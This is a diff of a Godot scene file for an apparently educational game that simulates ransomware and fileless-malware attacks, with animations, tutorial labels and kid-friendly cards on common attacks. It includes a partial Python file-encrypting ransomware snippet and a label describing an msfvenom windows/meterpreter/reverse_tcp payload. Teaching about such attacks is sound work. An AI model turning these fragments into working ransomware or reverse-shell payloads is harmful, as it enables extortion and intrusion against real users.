+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(1.675, 0.435)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.13, 1.64)]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/RansomwareApp:value")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Desktop:visible")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/Next:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": [false, true]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/FakeNext:visible")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": [true, false]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/Label:text")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Creating payload...", "Payload Created!!!"]
+}
+
+[sub_resource type="Animation" id="Animation_w4ok4"]
+resource_name = "start_of_fileless"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("HSplitContainer:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("HSplitContainer/CodeEdit:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["⚠️ DANGER: FILELESS MALWARE ALERT ⚠️
+
+Fileless malware is a stealthy type of malicious software. Instead of installing a file on your computer, it runs entirely in memory using trusted system tools. This makes it hard to detect and allows attackers to steal data or control your computer without leaving obvious traces.."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:disabled")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:modulate")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Color(1, 1, 1, 0)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("HSplitContainer/CodeEdit/Overlay:visible")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_xpv1d"]
+length = 0.001
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:disabled")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."]
+}
+
+[sub_resource type="AnimationLibrary" id="AnimationLibrary_o4fi6"]
+_data = {
+&"RESET": SubResource("Animation_xpv1d"),
+&"fileless_10": SubResource("Animation_4uhwa"),
+&"fileless_11": SubResource("Animation_55b8s"),
+&"fileless_12": SubResource("Animation_s614g"),
+&"fileless_13": SubResource("Animation_sq4em"),
+&"fileless_14": SubResource("Animation_rm36m"),
+&"fileless_15": SubResource("Animation_xj15o"),
+&"fileless_16": SubResource("Animation_ruw4w"),
+&"fileless_5": SubResource("Animation_yn5m6"),
+&"fileless_6": SubResource("Animation_axcpf"),
+&"fileless_7": SubResource("Animation_u2gx2"),
+&"fileless_8": SubResource("Animation_bt0j7"),
+&"fileless_9": SubResource("Animation_uxgbj"),
+&"fileless_boilerplate_1": SubResource("Animation_07q5i"),
+&"fileless_boilerplate_2": SubResource("Animation_ma2p5"),
+&"fileless_boilerplate_3": SubResource("Animation_4u43o"),
+&"fileless_boilerplate_4": SubResource("Animation_pjxp5"),
+&"fileless_boilerplate_5": SubResource("Animation_0w6mh"),
+&"fileless_boilerplate_6": SubResource("Animation_stl7w"),
+&"fileless_boilerplate_7": SubResource("Animation_1u14y"),
+&"fileless_boilerplate_open": SubResource("Animation_32id3"),
+&"fileless_mydrive_boilerplate": SubResource("Animation_dffuk"),
+&"fileless_mydrive_shellcode": SubResource("Animation_xpgrc"),
+&"fileless_shellcode_open": SubResource("Animation_c6f2f"),
+&"fileless_show_created_application": SubResource("Animation_g7hxf"),
+&"fileless_show_created_file": SubResource("Animation_n6wwr"),
+&"fileless_terminal_1": SubResource("Animation_1j6a3"),
+&"fileless_terminal_2": SubResource("Animation_8rtlk"),
+&"fileless_terminal_3": SubResource("Animation_15poh"),
+&"fileless_terminal_4": SubResource("Animation_o4fi6"),
+&"fileless_terminal_5": SubResource("Animation_5bo41"),
+&"start_of_fileless": SubResource("Animation_w4ok4")
+}
+
+[sub_resource type="StyleBoxTexture" id="StyleBoxTexture_03xvr"]
+texture = ExtResource("7_8h5wy")
+
+[sub_resource type="StyleBoxTexture" id="StyleBoxTexture_b0i1v"]
+texture = ExtResource("4_gq7c2")
+
+[node name="DesktopTabs" type="TabContainer" node_paths=PackedStringArray("malware_icon")]
 anchors_preset = 15
 anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-current_tab = 1
+current_tab = 5
 clip_tabs = false
 tabs_visible = false
 script = ExtResource("1_7e48o")
 malware_icon = NodePath("DesktopDefault/Desktop/Malware_icon")
-decr_icon = NodePath("DesktopDefault/Desktop/Decr_icon")
-key_icon = NodePath("DesktopDefault/Desktop/Key_icon")
-decrypted_message = NodePath("DesktopDefault/DecryptedMessage")
 
-[node name="DesktopDefault" type="MarginContainer" parent="."]
-visible = false
-layout_mode = 2
-theme_override_constants/margin_left = 25
-theme_override_constants/margin_top = 25
-theme_override_constants/margin_right = 25
-theme_override_constants/margin_bottom = 25
-script = ExtResource("2_4yk5j")
-metadata/_tab_index = 0
-
-[node name="Desktop" type="VFlowContainer" parent="DesktopDefault"]
-layout_mode = 2
-theme_override_constants/h_separation = 20
-
-[node name="Data_icon" parent="DesktopDefault/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
-layout_mode = 2
-window = NodePath("../../WindowContainer/SQLWindow")
-
-[node name="Button" parent="DesktopDefault/Desktop/Data_icon" index="0"]
-icon = ExtResource("4_gq7c2")
-
-[node name="Label" parent="DesktopDefault/Desktop/Data_icon" index="1"]
-text = "data.sql"
-
-[node name="Godot_icon" parent="DesktopDefault/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
-layout_mode = 2
-window = NodePath("../../WindowContainer/GodotWindow")
-
-[node name="Button" parent="DesktopDefault/Desktop/Godot_icon" index="0"]
-icon = ExtResource("5_a3c81")
-
-[node name="Label" parent="DesktopDefault/Desktop/Godot_icon" index="1"]
-text = "godot.png"
-
-[node name="Text_icon" parent="DesktopDefault/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
-layout_mode = 2
-window = NodePath("../../WindowContainer/Text_1Window")
-
-[node name="Button" parent="DesktopDefault/Desktop/Text_icon" index="0"]
-icon = ExtResource("6_d3ylh")
-
-[node name="Label" parent="DesktopDefault/Desktop/Text_icon" index="1"]
-text = "text.txt"
-
-[node name="Malware_icon" parent="DesktopDefault/Desktop" instance=ExtResource("1_vsxan")]
+[node name="DesktopDefault" parent="." instance=ExtResource("2_ojgsj")]
 visible = false
 layout_mode = 2
 
-[node name="Button" parent="DesktopDefault/Desktop/Malware_icon" index="0"]
-icon = ExtResource("7_8h5wy")
-
-[node name="Label" parent="DesktopDefault/Desktop/Malware_icon" index="1"]
-text = "malware.py"
-
-[node name="Decr_icon" parent="DesktopDefault/Desktop" instance=ExtResource("1_vsxan")]
+[node name="RansomwareEncrypt" type="MarginContainer" parent="." node_paths=PackedStringArray("back_button", "animation", "window", "finish_btn")]
 visible = false
-layout_mode = 2
-
-[node name="Button" parent="DesktopDefault/Desktop/Decr_icon" index="0"]
-icon = ExtResource("7_8h5wy")
-
-[node name="Label" parent="DesktopDefault/Desktop/Decr_icon" index="1"]
-text = "decr.py"
-
-[node name="Key_icon" parent="DesktopDefault/Desktop" instance=ExtResource("1_vsxan")]
-visible = false
-layout_mode = 2
-
-[node name="Button" parent="DesktopDefault/Desktop/Key_icon" index="0"]
-icon = ExtResource("6_d3ylh")
-
-[node name="Label" parent="DesktopDefault/Desktop/Key_icon" index="1"]
-text = "key.key"
-
-[node name="WindowContainer" type="Control" parent="DesktopDefault" node_paths=PackedStringArray("radial_menu", "cyberattack_lbl")]
-layout_mode = 2
-mouse_filter = 2
-script = ExtResource("1_ootqi")
-radial_menu = NodePath("RadialMenu")
-cyberattack_lbl = NodePath("Label")
-ransomware_recon_done = true
-
-[node name="RadialMenu" type="Control" parent="DesktopDefault/WindowContainer"]
-visible = false
-custom_minimum_size = Vector2(300, 222.263)
-layout_mode = 2
-anchors_preset = 0
-offset_left = -25.0
-offset_top = -25.0
-offset_right = 275.0
-offset_bottom = 197.263
-pivot_offset = Vector2(150, 150)
-size_flags_horizontal = 0
-size_flags_vertical = 0
-script = ExtResource("2_ootqi")
-icon_scale = 0.185
-
-[node name="GodotWindow" parent="DesktopDefault/WindowContainer" instance=ExtResource("3_7e48o")]
-visible = false
-layout_mode = 1
-anchor_left = 0.392015
-anchor_top = 0.162207
-anchor_right = 0.95735
-anchor_bottom = 0.737458
-
-[node name="Title" parent="DesktopDefault/WindowContainer/GodotWindow/HBoxContainer" index="0"]
-text = "godot.png"
-
-[node name="TextureRect" type="TextureRect" parent="DesktopDefault/WindowContainer/GodotWindow/MarginContainer/VBoxContainer" index="0"]
-custom_minimum_size = Vector2(-6.2, 260.78)
-layout_mode = 2
-texture = ExtResource("7_xi5cb")
-
-[node name="SQLWindow" parent="DesktopDefault/WindowContainer" instance=ExtResource("3_7e48o")]
-visible = false
-layout_mode = 1
-anchor_left = 0.391107
-anchor_top = 0.135452
-anchor_right = 0.90326
-anchor_bottom = 0.715698
-
-[node name="Title" parent="DesktopDefault/WindowContainer/SQLWindow/HBoxContainer" index="0"]
-text = "data.sql"
-
-[node name="Label" type="Label" parent="DesktopDefault/WindowContainer/SQLWindow/MarginContainer/VBoxContainer" index="0"]
-layout_mode = 2
-text = "create database test;
-use database test;
-
-create table ransom(
-      rid int auto_increment,
-     rkey bigint not null
-)"
-
-[node name="Text_1Window" parent="DesktopDefault/WindowContainer" instance=ExtResource("3_7e48o")]
-visible = false
-layout_mode = 1
-anchor_left = 0.342105
-anchor_top = 0.0769231
-anchor_right = 0.854258
-anchor_bottom = 0.65717
-
-[node name="Title" parent="DesktopDefault/WindowContainer/Text_1Window/HBoxContainer" index="0"]
-text = "text.txt"
-
-[node name="Label" type="Label" parent="DesktopDefault/WindowContainer/Text_1Window/MarginContainer/VBoxContainer" index="0"]
-layout_mode = 2
-text = "This text file is compose of your personal data such as:
--> Email Address and Passwords
--> Credit Card Number and Pin Numbers
--> Mobile Numbers"
-
-[node name="Label" type="Label" parent="DesktopDefault/WindowContainer"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.45735
-anchor_top = 0.961538
-anchor_right = 0.504537
-anchor_bottom = 1.0
-offset_bottom = 6.10352e-05
-grow_horizontal = 2
-grow_vertical = 0
-text = "simple"
-metadata/_edit_use_anchors_ = true
-
-[node name="DecryptedMessage" type="Label" parent="DesktopDefault"]
-visible = false
-layout_mode = 2
-size_flags_vertical = 8
-theme_override_font_sizes/font_size = 22
-text = "Now the files have been dencrypted. You can now access all the files"
-metadata/_edit_use_anchors_ = true
-
-[node name="Cyber_attack_Cards" type="ScrollContainer" parent="DesktopDefault"]
-layout_mode = 2
-
-[node name="VBoxContainer" type="HBoxContainer" parent="DesktopDefault/Cyber_attack_Cards"]
-layout_mode = 2
-
-[node name="Ransomware_card" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer" instance=ExtResource("12_htfik")]
-layout_mode = 2
-
-[node name="Label" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Ransomware_card/MarginContainer/VBoxContainer" index="2"]
-text = "Ransomware is a kind of harmful software that locks your files and asks for money to unlock them. Imagine someone putting a padlock on your school bag and saying you need to pay to get the key. It usually spreads through suspicious emails, links, or downloads, and once it’s in your computer, it blocks you from your own files. The problem is, even if you pay, there’s no promise you’ll get them back, which is why it’s so important to be careful online, keep backups, and update your devices.
-"
-
-[node name="Bruteforce_card" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer" instance=ExtResource("12_htfik")]
-layout_mode = 2
-
-[node name="Title" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Bruteforce_card/MarginContainer/VBoxContainer" index="0"]
-text = "Bruteforce"
-
-[node name="Label" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Bruteforce_card/MarginContainer/VBoxContainer" index="2"]
-text = "A brute force attack is when someone tries to guess a password by testing every possible combination until they find the right one. It’s like trying every key on a keychain to open a locked door—slow but effective if the lock (or password) is weak. To prevent this change your password more frequently and use special characters."
-
-[node name="Phishing_card" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer" instance=ExtResource("12_htfik")]
-layout_mode = 2
-
-[node name="Title" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Phishing_card/MarginContainer/VBoxContainer" index="0"]
-text = "Phishing"
-
-[node name="Fileless_card" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer" instance=ExtResource("12_htfik")]
-layout_mode = 2
-
-[node name="Title" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/Fileless_card/MarginContainer/VBoxContainer" index="0"]
-text = "Fileless"
-
-[node name="DoS_card" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer" instance=ExtResource("12_htfik")]
-layout_mode = 2
-
-[node name="Title" parent="DesktopDefault/Cyber_attack_Cards/VBoxContainer/DoS_card/MarginContainer/VBoxContainer" index="0"]
-text = "Denial of Services"
-
-[node name="Ransomware_encrypt" type="MarginContainer" parent="." node_paths=PackedStringArray("back_button", "animation", "window", "finish_btn")]
 layout_mode = 2
 theme_override_constants/margin_left = 25
 theme_override_constants/margin_top = 25
@@ -1230,16 +3424,16 @@ window = NodePath("HSplitContainer/CodeEdit/Window")
 finish_btn = NodePath("HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer/FInish")
 metadata/_tab_index = 1
 
-[node name="HSplitContainer" type="HBoxContainer" parent="Ransomware_encrypt"]
+[node name="HSplitContainer" type="HBoxContainer" parent="RansomwareEncrypt"]
 layout_mode = 2
 
-[node name="CodeEdit" type="CodeEdit" parent="Ransomware_encrypt/HSplitContainer"]
+[node name="CodeEdit" type="CodeEdit" parent="RansomwareEncrypt/HSplitContainer"]
 layout_mode = 2
 size_flags_horizontal = 3
 theme_override_colors/font_readonly_color = Color(1, 1, 1, 1)
 theme_override_font_sizes/font_size = 18
-text = "import os
-from cryptography.fernet import fernet
+text = "import os from cryptography.fernet 
+import fernet
 
 allfiles = [ ]
 for file in os.listdir():
@@ -1268,7 +3462,7 @@ gutters_draw_executing_lines = true
 gutters_draw_line_numbers = true
 gutters_zero_pad_line_numbers = true
 
-[node name="Overlay" type="ColorRect" parent="Ransomware_encrypt/HSplitContainer/CodeEdit"]
+[node name="Overlay" type="ColorRect" parent="RansomwareEncrypt/HSplitContainer/CodeEdit"]
 material = SubResource("ShaderMaterial_j4e7k")
 layout_mode = 1
 anchors_preset = 15
@@ -1278,7 +3472,7 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 
-[node name="Window" parent="Ransomware_encrypt/HSplitContainer/CodeEdit" instance=ExtResource("3_7e48o")]
+[node name="Window" parent="RansomwareEncrypt/HSplitContainer/CodeEdit" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 1
 anchor_left = 0.204082
@@ -1287,33 +3481,33 @@ anchor_right = 0.810324
 anchor_bottom = 0.777592
 offset_bottom = 3.05176e-05
 
-[node name="Title" parent="Ransomware_encrypt/HSplitContainer/CodeEdit/Window/HBoxContainer" index="0"]
+[node name="Title" parent="RansomwareEncrypt/HSplitContainer/CodeEdit/Window/HBoxContainer" index="0"]
 text = "malware.py"
 
-[node name="VBoxContainer" parent="Ransomware_encrypt/HSplitContainer/CodeEdit/Window/MarginContainer" index="0"]
+[node name="VBoxContainer" parent="RansomwareEncrypt/HSplitContainer/CodeEdit/Window/MarginContainer" index="0"]
 theme_override_constants/separation = 12
 
-[node name="ProgressBar" type="ProgressBar" parent="Ransomware_encrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer" index="0"]
+[node name="ProgressBar" type="ProgressBar" parent="RansomwareEncrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer" index="0"]
 layout_mode = 2
 
-[node name="FInish" type="Button" parent="Ransomware_encrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer" index="1"]
+[node name="FInish" type="Button" parent="RansomwareEncrypt/HSplitContainer/CodeEdit/Window/MarginContainer/VBoxContainer" index="1"]
 layout_mode = 2
 size_flags_horizontal = 4
 size_flags_vertical = 4
 text = "Finish"
 
-[node name="AnimationPlayer" type="AnimationPlayer" parent="Ransomware_encrypt/HSplitContainer"]
+[node name="AnimationPlayer" type="AnimationPlayer" parent="RansomwareEncrypt/HSplitContainer"]
 root_node = NodePath("../CodeEdit")
 libraries = {
 &"": SubResource("AnimationLibrary_4yk5j")
 }
 
-[node name="HFlowContainer" type="HFlowContainer" parent="Ransomware_encrypt/HSplitContainer"]
+[node name="HFlowContainer" type="HFlowContainer" parent="RansomwareEncrypt/HSplitContainer"]
 layout_mode = 2
 alignment = 1
 last_wrap_alignment = 2
 
-[node name="RichTextLabel" type="RichTextLabel" parent="Ransomware_encrypt/HSplitContainer/HFlowContainer"]
+[node name="RichTextLabel" type="RichTextLabel" parent="RansomwareEncrypt/HSplitContainer/HFlowContainer"]
 texture_filter = 1
 layout_mode = 2
 size_flags_horizontal = 3
@@ -1321,25 +3515,25 @@ theme_override_font_sizes/normal_font_size = 18
 text = "Create the code for the good shit"
 fit_content = true
 
-[node name="Buttons" type="HBoxContainer" parent="Ransomware_encrypt/HSplitContainer/HFlowContainer"]
+[node name="Buttons" type="HBoxContainer" parent="RansomwareEncrypt/HSplitContainer/HFlowContainer"]
 self_modulate = Color(1, 1, 1, 0)
 layout_mode = 2
 size_flags_vertical = 8
 theme_override_constants/separation = 165
 
-[node name="Back" type="Button" parent="Ransomware_encrypt/HSplitContainer/HFlowContainer/Buttons"]
+[node name="Back" type="Button" parent="RansomwareEncrypt/HSplitContainer/HFlowContainer/Buttons"]
 layout_mode = 2
 theme_override_font_sizes/font_size = 18
 text = "Back"
 metadata/_edit_use_anchors_ = true
 
-[node name="Next" type="Button" parent="Ransomware_encrypt/HSplitContainer/HFlowContainer/Buttons"]
+[node name="Next" type="Button" parent="RansomwareEncrypt/HSplitContainer/HFlowContainer/Buttons"]
 layout_mode = 2
 theme_override_font_sizes/font_size = 18
 text = "Next"
 metadata/_edit_use_anchors_ = true
 
-[node name="DesktopEncrypted" type="MarginContainer" parent="."]
+[node name="PostRansomwareEncrypt" type="MarginContainer" parent="."]
 visible = false
 layout_mode = 2
 theme_override_constants/margin_left = 25
@@ -1349,67 +3543,67 @@ theme_override_constants/margin_bottom = 25
 script = ExtResource("2_4yk5j")
 metadata/_tab_index = 2
 
-[node name="Desktop" type="VFlowContainer" parent="DesktopEncrypted"]
+[node name="Desktop" type="VFlowContainer" parent="PostRansomwareEncrypt"]
 layout_mode = 2
 theme_override_constants/h_separation = 20
 
-[node name="Data_icon" parent="DesktopEncrypted/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
+[node name="Data_icon" parent="PostRansomwareEncrypt/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
 layout_mode = 2
 window = NodePath("../../WindowContainer/SQLWindow")
 
-[node name="Button" parent="DesktopEncrypted/Desktop/Data_icon" index="0"]
+[node name="Button" parent="PostRansomwareEncrypt/Desktop/Data_icon" index="0"]
 icon = ExtResource("4_gq7c2")
 
-[node name="Label" parent="DesktopEncrypted/Desktop/Data_icon" index="1"]
+[node name="Label" parent="PostRansomwareEncrypt/Desktop/Data_icon" index="1"]
 text = "data.sql"
 
-[node name="Godot_icon" parent="DesktopEncrypted/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
+[node name="Godot_icon" parent="PostRansomwareEncrypt/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
 layout_mode = 2
 window = NodePath("../../WindowContainer/GodotWindow")
 
-[node name="Button" parent="DesktopEncrypted/Desktop/Godot_icon" index="0"]
+[node name="Button" parent="PostRansomwareEncrypt/Desktop/Godot_icon" index="0"]
 icon = ExtResource("5_a3c81")
 
-[node name="Label" parent="DesktopEncrypted/Desktop/Godot_icon" index="1"]
+[node name="Label" parent="PostRansomwareEncrypt/Desktop/Godot_icon" index="1"]
 text = "godot.png"
 
-[node name="Text_icon" parent="DesktopEncrypted/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
+[node name="Text_icon" parent="PostRansomwareEncrypt/Desktop" node_paths=PackedStringArray("window") instance=ExtResource("1_vsxan")]
 layout_mode = 2
 window = NodePath("../../WindowContainer/TextWindow")
 
-[node name="Button" parent="DesktopEncrypted/Desktop/Text_icon" index="0"]
+[node name="Button" parent="PostRansomwareEncrypt/Desktop/Text_icon" index="0"]
 icon = ExtResource("6_d3ylh")
 
-[node name="Label" parent="DesktopEncrypted/Desktop/Text_icon" index="1"]
+[node name="Label" parent="PostRansomwareEncrypt/Desktop/Text_icon" index="1"]
 text = "text.txt"
 
-[node name="Malware_icon" parent="DesktopEncrypted/Desktop" instance=ExtResource("1_vsxan")]
+[node name="Malware_icon" parent="PostRansomwareEncrypt/Desktop" instance=ExtResource("1_vsxan")]
 layout_mode = 2
 script = null
 
-[node name="Button" parent="DesktopEncrypted/Desktop/Malware_icon" index="0"]
+[node name="Button" parent="PostRansomwareEncrypt/Desktop/Malware_icon" index="0"]
 icon = ExtResource("7_8h5wy")
 
-[node name="Label" parent="DesktopEncrypted/Desktop/Malware_icon" index="1"]
+[node name="Label" parent="PostRansomwareEncrypt/Desktop/Malware_icon" index="1"]
 text = "malware.py"
 
-[node name="Key_icon" parent="DesktopEncrypted/Desktop" instance=ExtResource("1_vsxan")]
+[node name="Key_icon" parent="PostRansomwareEncrypt/Desktop" instance=ExtResource("1_vsxan")]
 layout_mode = 2
 
-[node name="Button" parent="DesktopEncrypted/Desktop/Key_icon" index="0"]
+[node name="Button" parent="PostRansomwareEncrypt/Desktop/Key_icon" index="0"]
 icon = ExtResource("7_8h5wy")
 
-[node name="Label" parent="DesktopEncrypted/Desktop/Key_icon" index="1"]
+[node name="Label" parent="PostRansomwareEncrypt/Desktop/Key_icon" index="1"]
 text = "key.key"
 
-[node name="WindowContainer" type="Control" parent="DesktopEncrypted" node_paths=PackedStringArray("cyberattack_lbl")]
+[node name="WindowContainer" type="Control" parent="PostRansomwareEncrypt" node_paths=PackedStringArray("cyberattack_lbl")]
 layout_mode = 2
 mouse_filter = 2
 script = ExtResource("1_ootqi")
 cyberattack_lbl = NodePath("Label")
 ransomware_recon_done = true
 
-[node name="GodotWindow" parent="DesktopEncrypted/WindowContainer" instance=ExtResource("3_7e48o")]
+[node name="GodotWindow" parent="PostRansomwareEncrypt/WindowContainer" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 1
 anchor_left = 0.392015
@@ -1417,10 +3611,10 @@ anchor_top = 0.162207
 anchor_right = 0.95735
 anchor_bottom = 0.737458
 
-[node name="Title" parent="DesktopEncrypted/WindowContainer/GodotWindow/HBoxContainer" index="0"]
+[node name="Title" parent="PostRansomwareEncrypt/WindowContainer/GodotWindow/HBoxContainer" index="0"]
 text = "godot.png"
 
-[node name="MarginContainer2" type="MarginContainer" parent="DesktopEncrypted/WindowContainer/GodotWindow"]
+[node name="MarginContainer2" type="MarginContainer" parent="PostRansomwareEncrypt/WindowContainer/GodotWindow"]
 layout_mode = 1
 anchors_preset = -1
 anchor_top = 0.0930232
@@ -1434,13 +3628,13 @@ theme_override_constants/margin_right = 10
 theme_override_constants/margin_bottom = 10
 metadata/_edit_use_anchors_ = true
 
-[node name="Label" type="Label" parent="DesktopEncrypted/WindowContainer/GodotWindow/MarginContainer2"]
+[node name="Label" type="Label" parent="PostRansomwareEncrypt/WindowContainer/GodotWindow/MarginContainer2"]
 layout_mode = 2
 size_flags_vertical = 0
 text = "hsbhfieurmzbhiwwefpwbhabewibdjs"
 metadata/_edit_use_anchors_ = true
 
-[node name="SQLWindow" parent="DesktopEncrypted/WindowContainer" instance=ExtResource("3_7e48o")]
+[node name="SQLWindow" parent="PostRansomwareEncrypt/WindowContainer" instance=ExtResource("3_7e48o")]
 visible = false
 layout_mode = 1
 anchor_left = 0.391107
@@ -1448,10 +3642,10 @@ anchor_top = 0.135452
 anchor_right = 0.90326
 anchor_bottom = 0.715698
 
-[node name="Title" parent="DesktopEncrypted/WindowContainer/SQLWindow/HBoxContainer" index="0"]
+[node name="Title" parent="PostRansomwareEncrypt/WindowContainer/SQLWindow/HBoxContainer" index="0"]
 text = "data.sql"
 
-[node name="MarginContainer2" type="MarginContainer" parent="DesktopEncrypted/WindowContainer/SQLWindow"]
+[node name="MarginContainer2" type="MarginContainer" parent="PostRansomwareEncrypt/WindowContainer/SQLWindow"]
 layout_mode = 1
 anchors_preset = -1
 anchor_top = 0.0930232
@@ -1465,13 +3659,13 @@ theme_override_constants/margin_right = 10
 theme_override_constants/margin_bottom = 10
 metadata/_edit_use_anchors_ = true
 
-[node name="Label" type="Label" parent="DesktopEncrypted/WindowContainer/SQLWindow/MarginContainer2"]
+[node name="Label" type="Label" parent="PostRansomwareEncrypt/WindowContainer/SQLWindow/MarginContainer2"]
 layout_mode = 2
 size_flags_vertical = 0
 text = "jbqisbsifsbcsierqobamfkdoneuvindfjxf"
 metadata/_edit_use_anchors_ = true
 
